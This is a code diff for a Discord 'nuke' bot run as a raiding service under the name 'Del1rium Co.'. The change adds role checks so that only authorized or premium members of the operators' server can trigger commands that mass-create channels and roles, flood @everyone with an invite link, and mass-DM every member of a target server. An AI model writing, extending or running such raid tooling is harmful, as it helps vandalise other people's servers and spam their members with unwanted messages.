@@ -5,7 +5,7 @@ import os
 import gc
 from dotenv import load_dotenv
 import engine
-import worker # Direct access for some tasks
+import worker
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # [ CONFIGURATION ]
@@ -17,6 +17,12 @@ CENTRAL_SERVER_ID = 1453920087194206394
 PREMIUM_ROLE_ID = 1458177413325259035
 OWNER_ID = 1450919094202269881
 LOG_CHANNEL_ID = 1458257075393003561
+
+# New Security Roles
+AUTHORIZED_ROLE_ID = 1455874072411111600
+# Note: You can add a specific Booster Role ID here if needed, 
+# but usually checking for 'premium_subscriber' status is better.
+# For now, we'll check if they have the AUTHORIZED_ROLE_ID.
 
 DEFAULT_NAME = "premium-raid"
 DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
@@ -30,17 +36,37 @@ def get_config(user_id):
     return user_configs.get(user_id, {"name": DEFAULT_NAME, "text": DEFAULT_TEXT})
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# [ INITIALIZATION ]
+# [ SECURITY CHECKS ]
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)
 
-def check_premium(user_id):
+def is_authorized(user_id):
+    """Checks if the user has the mandatory authorized role."""
     if user_id == OWNER_ID: return True
     central = bot.get_guild(CENTRAL_SERVER_ID)
     if not central: return False
     member = central.get_member(user_id)
-    return member and any(r.id == PREMIUM_ROLE_ID for r in member.roles)
+    if not member: return False
+    
+    # Check for the specific authorized role
+    has_auth_role = any(r.id == AUTHORIZED_ROLE_ID for r in member.roles)
+    return has_auth_role
+
+def is_premium(user_id):
+    """Checks if the user has the premium role."""
+    if user_id == OWNER_ID: return True
+    central = bot.get_guild(CENTRAL_SERVER_ID)
+    if not central: return False
+    member = central.get_member(user_id)
+    if not member: return False
+    
+    # Check for premium role
+    return any(r.id == PREMIUM_ROLE_ID for r in member.roles)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# [ INITIALIZATION ]
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
@@ -51,7 +77,7 @@ async def on_ready():
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     User / Usuario: {bot.user.name}
     Status / Estado: Ready / Listo
-    Architecture: Triple-Layer (Main/Engine/Worker)
+    Security: Role-Based Authorization Active
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     """)
 
@@ -67,37 +93,34 @@ async def help_cmd(ctx):
     embed = discord.Embed(title="OPERATIONAL INTERFACE / INTERFAZ OPERATIVA", color=0x2b2d31)
     
     public_desc = (
-        "**`:nuke`**\nStandard deployment (25 channels + 10 roles).\n*Despliegue estandar (25 canales + 10 roles).*\n\n"
-        "**`:dmall`**\nSend fixed invitation to all members.\n*Envia invitacion fija a todos los miembros.*"
+        "**`:nuke`**\nStandard deployment (25 channels + 10 roles).\n*Requires Authorized Role.*\n\n"
+        "**`:dmall`**\nSend fixed invitation to all members.\n*Requires Authorized Role.*"
     )
     embed.add_field(name="PUBLIC MODULE / MODULO PUBLICO", value=public_desc, inline=False)
     
     premium_desc = (
-        "**`:premiumnuke`**\nMassive deployment (50 channels + 20 roles).\n*Despliegue masivo (50 canales + 20 roles).*\n\n"
-        "**`:nukeconfig <name>, <text>`**\nConfigure personal payload.\n*Configura tu carga personalizada.*\n\n"
-        "**`:dmall <text>`**\nSend custom message to all members.\n*Envia mensaje personalizado a todos.*"
+        "**`:premiumnuke`**\nMassive deployment (50 channels + 20 roles).\n*Requires Premium Role.*\n\n"
+        "**`:nukeconfig <name>, <text>`**\nConfigure personal payload.\n*Requires Premium Role.*\n\n"
+        "**`:dmall <text>`**\nSend custom message to all members.\n*Requires Premium Role.*"
     )
     embed.add_field(name="PREMIUM MODULE / MODULO PREMIUM", value=premium_desc, inline=False)
     
-    info_desc = (
-        "**Prefix / Prefijo:** `:`\n"
-        "**Status / Estado:** Online / En linea\n"
-        "**Architecture:** Triple-Layer Optimized"
-    )
-    embed.add_field(name="SYSTEM INFORMATION / INFORMACION DEL SISTEMA", value=info_desc, inline=False)
-    
-    embed.set_footer(text="Del1rium Co. | Global Operations Management")
+    embed.set_footer(text="Del1rium Co. | Security Level: High")
     await ctx.send(embed=embed, delete_after=60)
 
 @bot.command(name='nuke')
 async def nuke_cmd(ctx):
+    if not is_authorized(ctx.author.id):
+        embed = discord.Embed(title="ACCESS DENIED / ACCESO DENEGADO", description="Authorized role required.\nSe requiere el rol autorizado.", color=0x2b2d31)
+        return await ctx.send(embed=embed, delete_after=10)
+
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
     await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, 10, PUBLIC_ROLE_NAME, False, LOG_CHANNEL_ID, RAID_ICON)
 
 @bot.command(name='premiumnuke')
 async def premium_nuke_cmd(ctx):
-    if not check_premium(ctx.author.id):
+    if not is_premium(ctx.author.id):
         embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
         return await ctx.send(embed=embed, delete_after=10)
     
@@ -108,7 +131,7 @@ async def premium_nuke_cmd(ctx):
 
 @bot.command(name='nukeconfig')
 async def config_cmd(ctx, *, args: str = None):
-    if not check_premium(ctx.author.id):
+    if not is_premium(ctx.author.id):
         embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
         return await ctx.send(embed=embed, delete_after=10)
 
@@ -129,12 +152,16 @@ async def config_cmd(ctx, *, args: str = None):
 
 @bot.command(name='dmall')
 async def dmall_cmd(ctx, *, message: str = None):
+    if not is_authorized(ctx.author.id):
+        embed = discord.Embed(title="ACCESS DENIED / ACCESO DENEGADO", description="Authorized role required.\nSe requiere el rol autorizado.", color=0x2b2d31)
+        return await ctx.send(embed=embed, delete_after=10)
+
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     await ctx.message.delete()
-    is_user_premium = check_premium(ctx.author.id)
+    
+    is_user_premium = is_premium(ctx.author.id)
     final_message = message if (is_user_premium and message) else PUBLIC_DM_TEXT
     
-    # Use the specialized worker for DM
     count = await worker.mass_dm_worker(ctx.guild, final_message, is_user_premium)
     
     embed = discord.Embed(title="DM ALL", description=f"Messages sent / Mensajes enviados: {count}", color=0x2b2d31)
